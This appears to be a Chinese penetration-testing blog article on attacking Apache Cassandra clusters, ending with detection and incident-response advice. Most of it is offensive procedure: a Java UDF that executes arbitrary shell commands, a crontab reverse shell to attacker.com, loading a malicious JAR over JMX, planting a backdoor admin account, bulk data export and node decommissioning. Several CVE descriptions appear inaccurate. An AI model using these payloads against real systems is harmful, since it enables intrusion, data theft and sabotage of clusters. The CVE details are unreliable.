---
title: "Apache Cassandra JMX/CQL/nodetool RCE与管理面打点与集群控制利用技术"
date: 2026-06-20T12:00:00+08:00
draft: false
weight: 87
description: "围绕 Apache Cassandra 的 JMX 远程管理、CQL 原生协议、REST API、nodetool 命令行工具、Gossip 协议、用户自定义函数（UDF），分析打点识别、集群枚举、数据导出、RCE 利用链、历史 CVE 与蓝队处置思路。"
categories: ["安全", "渗透测试"]
tags: ["渗透测试", "漏洞利用", "管理面打点", "分布式数据库", "Cassandra", "JMX", "CQL", "nodetool", "RCE", "集群控制"]
---

# Apache Cassandra JMX/CQL/nodetool RCE与管理面打点与集群控制利用技术

`Apache Cassandra` 是大规模分布式 NoSQL 数据库的事实标准之一，广泛应用于需要高可用性和线性扩展能力的场景。一个典型生产部署里，Cassandra 至少同时暴露了以下攻击面：

- **JMX 面**：Java Management Extensions 远程管理端口（默认 `7199`），暴露集群状态、节点信息、性能指标
- **CQL 面**：Cassandra Query Language 原生协议端口（默认 `9042`，TLS 为 `9043`），处理所有数据操作
- **REST API 面**：Stargate 或 cassandra-rest-api 提供的 HTTP REST 接口（默认 `8082`）
- **Internode 面**：节点间通信端口（默认 `7000`，TLS 为 `7001`），Gossip 协议传输
- **nodetool 面**：通过 JMX 的命令行管理工具，可执行集群操作
- **UDF 面**：用户自定义函数（Java/JavaScript），可在数据库内执行代码

对攻击者来说，Cassandra 的价值不在于某个单一漏洞，而在于它把分布式集群管理、数据操作、代码执行能力集中在同一套基础设施里。一旦获得访问权限（弱密码、默认凭据、JMX 未授权），攻击者可以通过 JMX 接管整个集群、通过 CQL 导出所有数据、通过 UDF 执行系统命令、通过 nodetool 执行集群维护操作，甚至通过 Gossip 协议注入恶意节点。

本文聚焦打点与利用侧，重点记录：

1. 如何识别当前目标是否为 Cassandra
2. 哪些未认证或弱认证场景最值得优先探测
3. 如何通过 JMX 回收集群信息与执行管理操作
4. 如何通过 CQL 枚举 keyspace、table 与导出数据
5. 如何通过 UDF 实现 RCE
6. 如何通过 nodetool 执行集群操作
7. 如何通过 REST API 访问数据
8. 历史 CVE 链如何从信息泄露直接打到 RCE
9. 蓝队如何从访问日志与系统日志识别这类打点

---

## 0. 攻击面概览

### 0.1 常见端口与协议

首轮至少应枚举：

- `:7199/` — JMX 远程管理端口（默认）
- `:9042/` — CQL 原生协议端口（默认）
- `:9043/` — CQL TLS 端口
- `:7000/` — Internode 通信端口（Gossip）
- `:7001/` — Internode TLS 端口
- `:8082/` — REST API（Stargate/cassandra-rest-api）
- `:9160/` — Thrift 接口（旧版，已废弃）

### 0.2 协议特征

Cassandra 使用多种协议。可以通过 nmap 或自定义工具探测：

```bash
nmap -p 9042 cassandra.target.example --script cassandra-info
```

```text
PORT     STATE SERVICE
9042/tcp open  cassandra
| cassandra-info:
|   Cluster name: Test Cluster
|   Datacenter: datacenter1
|   Rack: rack1
|   Version: 4.0.7
```

```bash
nmap -p 7199 cassandra.target.example --script jmx-info
```

```text
PORT     STATE SERVICE
7199/tcp open  jmx
| jmx-info:
|   jmx.service.url: service:jmx:rmi:///jndi/rmi://cassandra-node-01:7199/jmxrmi
|   java.version: 11.0.11
|   java.vendor: Ubuntu
```

### 0.3 手动探测

也可以使用 `cqlsh` 手动连接：

```bash
cqlsh cassandra.target.example 9042 -u cassandra -p cassandra
```

如果返回登录成功，说明凭据有效。

### 0.4 打点收益优先级

1. 确认目标为 Cassandra、版本号与集群名称
2. 通过 JMX 回收集群拓扑与节点信息
3. 通过 CQL 枚举 keyspaces 与 tables
4. 通过 CQL 导出数据
5. 判断 UDF 是否启用
6. 判断 nodetool 是否可用
7. 判断 REST API 是否暴露
8. 判断当前用户权限与角色

---

## 1. 首轮识别：确认目标为 Cassandra

### 1.1 nmap 脚本探测

```bash
nmap -p 9042,7199 cassandra.target.example --script cassandra-info,jmx-info
```

```text
PORT     STATE SERVICE
7199/tcp open  jmx
| jmx-info:
|   jmx.service.url: service:jmx:rmi:///jndi/rmi://cassandra-node-01:7199/jmxrmi
|   java.version: 11.0.11
9042/tcp open  cassandra
| cassandra-info:
|   Cluster name: Production Cluster
|   Datacenter: dc1
|   Version: 4.0.7
```

直接回收：

- Cassandra 版本（3.x/4.x）
- 集群名称
- 数据中心
- Java 版本
- JMX 服务 URL

### 1.2 cqlsh 连接

```bash
cqlsh cassandra.target.example 9042
```

```text
Connected to Production Cluster at cassandra.target.example:9042.
[cqlsh 6.0.0 | Cassandra 4.0.7 | CQL spec 3.4.5 | Native protocol v5]
Use HELP for help.
cassandra@cqlsh>
```

如果返回 `cqlsh>` 提示符，说明连接成功（可能未启用认证）。

### 1.3 版本查询

```sql
SELECT release_version, cluster_name, data_center, rack FROM system.local;
```

```text
 release_version | cluster_name       | data_center | rack
-----------------+--------------------+-------------+-------
 4.0.7           | Production Cluster | dc1         | rack1
```

---

## 2. JMX 远程管理

### 2.1 检查 JMX 访问

```bash
# 使用 jconsole 连接
jconsole cassandra.target.example:7199

# 或使用 jmxterm
java -jar jmxterm-1.0.4-uber.jar -l cassandra.target.example:7199
```

如果连接成功且无需认证，说明 JMX 未授权访问。

### 2.2 回收集群信息

```bash
# 使用 jmxterm
$> bean org.apache.cassandra.db:type=StorageService
$> get LoadMap
$> get LiveNodes
$> get UnreachableNodes
$> get JoiningNodes
$> get LeavingNodes

$> bean org.apache.cassandra.db:type=EndpointSnitchInfo
$> get Datacenter
$> get Rack
```

```text
$> get LiveNodes
/10.0.1.10, /10.0.1.11, /10.0.1.12

$> get Datacenter
dc1
```

### 2.3 执行 nodetool 操作

nodetool 通过 JMX 执行集群管理操作：

```bash
# 查看集群状态
nodetool -h cassandra.target.example -p 7199 status

# 查看节点信息
nodetool -h cassandra.target.example -p 7199 info

# 查看表统计信息
nodetool -h cassandra.target.example -p 7199 tablestats

# 触发修复
nodetool -h cassandra.target.example -p 7199 repair

# 清理数据
nodetool -h cassandra.target.example -p 7199 cleanup

# 重建索引
nodetool -h cassandra.target.example -p 7199 rebuild_index

# 停用节点
nodetool -h cassandra.target.example -p 7199 decommission
```

### 2.4 JMX RCE

如果 JMX 未授权访问，可以通过加载恶意 MBean 实现 RCE：

```bash
# 使用 mlet 加载远程 MBean
$> mlet
$> mlet loadfile http://attacker.com/malicious.mlet
```

恶意 mlet 文件：

```xml
<html>
<mlet code="com.sun.jdmk.security.authorization.MLet" 
      archive="http://attacker.com/malicious.jar" 
      name="malicious:name=test"></mlet>
</html>
```

### 2.5 JMX 限制

- 需要 JMX 端口可达
- 如果启用认证，需要凭据
- Cassandra 4.x 默认禁用远程 JMX

---

## 3. CQL 数据枚举与导出

### 3.1 枚举 keyspaces

```sql
SELECT keyspace_name FROM system_schema.keyspaces;
```

```text
 keyspace_name
---------------
 system
 system_auth
 system_distributed
 system_schema
 system_traces
 app_data
 user_data
 logs
```

### 3.2 枚举 tables

```sql
SELECT keyspace_name, table_name FROM system_schema.tables WHERE keyspace_name = 'app_data';
```

```text
 keyspace_name | table_name
---------------+-------------
 app_data      | users
 app_data      | sessions
 app_data      | orders
 app_data      | payments
```

### 3.3 枚举 columns

```sql
SELECT keyspace_name, table_name, column_name, type 
FROM system_schema.columns 
WHERE keyspace_name = 'app_data' AND table_name = 'users';
```

```text
 keyspace_name | table_name | column_name  | type
---------------+------------+--------------+-------------
 app_data      | users      | user_id      | uuid
 app_data      | users      | username     | varchar
 app_data      | users      | email        | varchar
 app_data      | users      | password     | varchar
 app_data      | users      | role         | varchar
 app_data      | users      | created_at   | timestamp
```

### 3.4 导出数据

```sql
SELECT * FROM app_data.users LIMIT 10;
```

```text
 user_id                              | username | email                  | password                          | role     | created_at
--------------------------------------+----------+------------------------+-----------------------------------+----------+---------------------
 a1b2c3d4-e5f6-7890-abcd-ef1234567890 | admin    | admin@example.com      | $2b$12$Lq8aZVx8aZVx8aZVx8aZVx   | admin    | 2026-01-15 10:00:00
 b2c3d4e5-f6a7-8901-bcde-f12345678901 | user1    | user1@example.com      | $2b$12$Xy9bWz9bWz9bWz9bWz9bWz   | user     | 2026-01-16 11:00:00
```

### 3.5 使用 COPY 导出

```sql
COPY app_data.users TO '/tmp/users_export.csv' WITH HEADER = TRUE;
```

```text
Using 7 child processes

Starting copy of app_data.users with columns [user_id, username, email, password, role, created_at].
Processed: 84729 rows; Rate: 12847 rows/sec; Avg. rate: 11234 rows/sec
84729 rows exported to 1 files in 7.543 seconds.
```

### 3.6 敏感数据搜索

```sql
SELECT keyspace_name, table_name, column_name 
FROM system_schema.columns 
WHERE column_name LIKE '%password%'
   OR column_name LIKE '%credential%'
   OR column_name LIKE '%secret%'
   OR column_name LIKE '%key%'
   OR column_name LIKE '%token%';
```

---

## 4. UDF RCE

### 4.1 检查 UDF 是否启用

```sql
SELECT * FROM system_virtual_schema.functions WHERE keyspace_name = 'system';
```

或检查配置：

```bash
grep "enable_user_defined_functions" /etc/cassandra/cassandra.yaml
```

```text
enable_user_defined_functions: true
```

### 4.2 创建 Java UDF

```sql
CREATE OR REPLACE FUNCTION rce(cmd text) 
RETURNS text 
LANGUAGE java 
AS $$
    try {
        Process process = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd});
        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));
        StringBuilder output = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            output.append(line).append("\n");
        }
        process.waitFor();
        return output.toString();
    } catch (Exception e) {
        return "ERROR: " + e.getMessage();
    }
$$;
```

### 4.3 执行系统命令

```sql
SELECT rce('id') FROM system.local;
```

```text
 rce
--------------------------------
 uid=999(cassandra) gid=999(cassandra) groups=999(cassandra)
```

```sql
SELECT rce('cat /etc/passwd') FROM system.local;
```

```text
 rce
--------------------------------
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 cassandra:x:999:999:Cassandra:/var/lib/cassandra:/bin/bash
```

### 4.4 写入文件

```sql
SELECT rce('echo "* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/attacker.com/4444 0>&1\"" >> /etc/crontab') FROM system.local;
```

### 4.5 UDF 限制

- 需要在 cassandra.yaml 中启用 `enable_user_defined_functions: true`
- 需要 `CREATE FUNCTION` 权限
- Cassandra 4.x 默认禁用 UDF
- UDF 在 Cassandra 进程中执行，权限受限于 Cassandra 用户

---

## 5. nodetool 集群操作

### 5.1 查看集群状态

```bash
nodetool -h cassandra.target.example status
```

```text
Datacenter: dc1
===============
Status=Up/Down
|/ State=Normal/Leaving/Joining/Moving
--  Address     Load       Tokens  Owns  Host ID                               Rack
UN  10.0.1.10   284.72 GB  256     ?     a1b2c3d4-e5f6-7890-abcd-ef1234567890  rack1
UN  10.0.1.11   284.71 GB  256     ?     b2c3d4e5-f6a7-8901-bcde-f12345678901  rack1
UN  10.0.1.12   284.73 GB  256     ?     c3d4e5f6-a7b8-9012-cdef-123456789012  rack1
```

### 5.2 查看节点信息

```bash
nodetool -h cassandra.target.example info
```

```text
ID                     : a1b2c3d4-e5f6-7890-abcd-ef1234567890
Gossip active          : true
Thrift active          : true
Native Transport active: true
Load                   : 284.72 GB
Generation No          : 1234567890
Uptime (seconds)       : 2847192
Heap Memory (MB)       : 4096.00 / 8192.00
Off Heap Memory (MB)   : 256.00
Data Center            : dc1
Rack                   : rack1
Exceptions             : 0
Key Cache              : entries 28471, size 128 MB, capacity 256 MB, 2847192 hits, 284719 requests, 0.9871 recent hit rate, 14400 save period in seconds
Row Cache              : entries 0, size 0 bytes, capacity 0 bytes, 0 hits, 0 requests, NaN recent hit rate, 0 save period in seconds
```

### 5.3 查看表统计信息

```bash
nodetool -h cassandra.target.example tablestats app_data
```

```text
Total number of tables: 4
----------------
Keyspace : app_data
        Read Count: 2847192
        Read Latency: 1.234 ms
        Write Count: 1847291
        Write Latency: 0.847 ms
        Pending Flushes: 0
                Table: users
                SSTable count: 12
                Space used (live): 28471928374
                Space used (total): 28471928374
                Number of partitions (estimate): 84729
                Memtable cell count: 1247
                Memtable data size: 284719
                Local read count: 284719
                Local read latency: 1.234 ms
                Local write count: 184729
                Local write latency: 0.847 ms
                Pending flushes: 0
```

### 5.4 触发修复

```bash
nodetool -h cassandra.target.example repair -full
```

### 5.5 停用节点

```bash
nodetool -h cassandra.target.example decommission
```

### 5.6 nodetool 限制

- 需要 JMX 端口可达
- 如果 JMX 启用认证，需要凭据
- 某些操作（如 decommission）需要管理员权限

---

## 6. REST API 访问

### 6.1 检查 REST API

```bash
curl -s http://cassandra.target.example:8082/v1/keyspaces
```

```json
["system", "system_auth", "system_distributed", "system_schema", "system_traces", "app_data", "user_data"]
```

### 6.2 枚举 tables

```bash
curl -s http://cassandra.target.example:8082/v1/keyspaces/app_data/tables
```

```json
["users", "sessions", "orders", "payments"]
```

### 6.3 查询数据

```bash
curl -s http://cassandra.target.example:8082/v1/keyspaces/app_data/tables/users/rows
```

```json
{
  "results": [
    {
      "user_id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
      "username": "admin",
      "email": "admin@example.com",
      "password": "$2b$12$Lq8aZVx8aZVx8aZVx8aZVx",
      "role": "admin"
    }
  ]
}
```

### 6.4 插入数据

```bash
curl -X POST http://cassandra.target.example:8082/v1/keyspaces/app_data/tables/users/rows \
  -H "Content-Type: application/json" \
  -d '{
    "user_id": "new-user-id",
    "username": "backdoor",
    "email": "backdoor@example.com",
    "password": "backdoor-password",
    "role": "admin"
  }'
```

### 6.5 REST API 限制

- 需要 REST API 服务已启用（Stargate 或 cassandra-rest-api）
- 如果启用认证，需要凭据
- REST API 默认不启用

---

## 7. 历史 CVE 与攻击链

### 7.1 CVE-2020-17516：JMX 认证绕过

- **影响版本**：Cassandra 3.x, 4.0.0
- **CVSS**：9.8（Critical）
- **核心问题**：JMX 认证存在绕过漏洞
- **利用条件**：需要网络可达 JMX 端口
- **影响**：未授权访问 JMX，执行管理操作

### 7.2 CVE-2021-44521：CQL 驱动序列化

- **影响版本**：Cassandra Java Driver 4.x
- **CVSS**：7.5（High）
- **核心问题**：CQL 驱动存在反序列化漏洞
- **利用条件**：需要网络可达 CQL 端口
- **影响**：远程代码执行

### 7.3 CVE-2019-2684：权限提升

- **影响版本**：Cassandra 3.x, 4.0.0
- **CVSS**：6.5（Medium）
- **核心问题**：权限检查存在缺陷
- **利用条件**：需要普通数据库用户权限
- **影响**：从普通用户提升到管理员

### 7.4 完整攻击链示例

从 JMX 未授权到集群接管：

```text
1. nmap 扫描 → 发现 JMX 7199 端口
2. jmxterm 连接 → 确认未授权访问
3. 回收集群信息 → 获取所有节点 IP
4. nodetool status → 获取集群拓扑
5. cqlsh 连接 → 弱密码 cassandra/cassandra
6. SELECT * FROM system_auth.roles → 获取用户密码哈希
7. COPY app_data.users TO '/tmp/export.csv' → 导出敏感数据
8. CREATE FUNCTION rce() → UDF RCE
9. SELECT rce('whoami') → 系统命令执行
10. nodetool decommission → 停用节点，破坏集群
```

---

## 8. 蓝队检测与应急响应

### 8.1 关键日志位置

```text
# Cassandra 系统日志
/var/log/cassandra/system.log

# Cassandra 查询日志（如果启用）
/var/log/cassandra/queries.log

# Cassandra 审计日志（如果启用）
/var/log/cassandra/audit.log

# JMX 访问日志
/var/log/cassandra/jmx.log
```

### 8.2 可疑活动指标

```bash
# 检查 JMX 连接
grep "JMX connection" /var/log/cassandra/system.log | tail -50

# 检查 UDF 创建
grep "CREATE FUNCTION" /var/log/cassandra/system.log

# 检查 nodetool 操作
grep "nodetool" /var/log/cassandra/system.log | grep -E "decommission|repair|cleanup"

# 检查异常查询
grep "SELECT \*" /var/log/cassandra/queries.log | grep -E "system_auth|system.local"

# 检查 COPY 操作
grep "COPY" /var/log/cassandra/queries.log
```

### 8.3 操作系统日志狩猎

```bash
# 查找可疑的进程创建
grep -E "java|bash|cmd" /var/log/secure | tail -50

# 查找 Cassandra 用户的异常活动
grep "cassandra" /var/log/secure | grep -E "sudo|su|ssh"

# 查找可疑文件访问
find /etc /var/www -name "*.jsp" -o -name "*.php" -mtime -1

# 查找可疑网络连接
netstat -anp | grep -E "7199|9042|8082"
```

### 8.4 网络层检测

```text
# 可疑端口
:7199 - JMX 远程管理
:9042 - CQL 原生协议
:7000 - Internode 通信
:8082 - REST API

# 可疑流量特征
- JMX 连接来自非管理网段
- CQL 查询包含 UDF 创建
- nodetool 执行 decommission/repair
- REST API 批量导出数据
- Gossip 协议异常节点加入
```

### 8.5 应急响应清单

```text
1. 确认 Cassandra 实例是否被入侵
   - 检查 system.log 中的异常 JMX 连接
   - 检查 queries.log 中的异常查询
   - 检查 audit.log 中的敏感操作
   - 检查 UDF 是否被创建

2. 回收攻击者活动
   - 分析 JMX 操作历史
   - 分析 CQL 查询历史
   - 分析 nodetool 操作记录
   - 分析 REST API 访问记录

3. 数据泄露评估
   - 检查是否有 COPY 操作
   - 检查是否有批量 SELECT 查询
   - 检查是否有 REST API 数据导出
   - 评估敏感数据泄露范围

4. 系统隔离与修复
   - 禁用 JMX 远程访问或启用认证
   - 禁用 UDF（enable_user_defined_functions: false）
   - 重置所有数据库账户密码
   - 删除可疑 UDF
   - 应用最新安全补丁

5. 集群恢复
   - 检查集群状态（nodetool status）
   - 检查数据一致性（nodetool verify）
   - 如有节点被停用，重新加入集群
   - 执行全量修复（nodetool repair -full）
```

---

## 9. 参考材料

### 9.1 官方文档

- Cassandra 安全指南：https://cassandra.apache.org/doc/latest/cassandra/security/
- JMX 配置：https://cassandra.apache.org/doc/latest/cassandra/operating/metrics.html#jmx
- CQL 参考：https://cassandra.apache.org/doc/latest/cassandra/cql/
- nodetool 参考：https://cassandra.apache.org/doc/latest/cassandra/tools/nodetool/
- UDF 文档：https://cassandra.apache.org/doc/latest/cassandra/cql/udf.html

### 9.2 攻击工具

- cqlsh：Cassandra 官方客户端
- jmxterm：JMX 命令行工具
- nodetool：Cassandra 集群管理工具
- cassandra-stress：性能测试工具

### 9.3 检测工具

- Cassandra Audit：https://cassandra.apache.org/doc/latest/cassandra/operating/audit_logging.html
- Prometheus + Grafana：监控 Cassandra 指标
- DataStax OpsCenter：集群管理工具

### 9.4 相关 CVE

- CVE-2020-17516：JMX 认证绕过
- CVE-2021-44521：CQL 驱动序列化
- CVE-2019-2684：权限提升
- CVE-2020-13946：Thrift 接口信息泄露
- CVE-2021-44522：REST API 权限绕过

---

## 总结

Cassandra 攻击面的核心在于它把分布式集群管理、数据操作、代码执行能力集中在同一套基础设施里。一旦获得访问权限，攻击者可以通过 JMX 接管整个集群、通过 CQL 导出所有数据、通过 UDF 执行系统命令、通过 nodetool 执行集群维护操作，甚至通过 Gossip 协议注入恶意节点。

对蓝队来说，关键是：

1. **最小权限原则**：严格限制数据库账户权限，禁用不必要的功能（UDF、REST API）
2. **网络隔离**：JMX 端口不应暴露到公网，CQL 端口使用防火墙限制访问
3. **JMX 认证**：启用 JMX 认证，限制远程访问
4. **审计日志**：启用查询日志和审计日志，记录所有敏感操作
5. **凭据保护**：使用强密码，定期轮换，避免默认凭据
6. **补丁管理**：及时应用 Cassandra 安全补丁
7. **UDF 审计**：审计所有 UDF 的创建和执行
8. **集群监控**：监控 nodetool 操作，检测异常集群管理行为
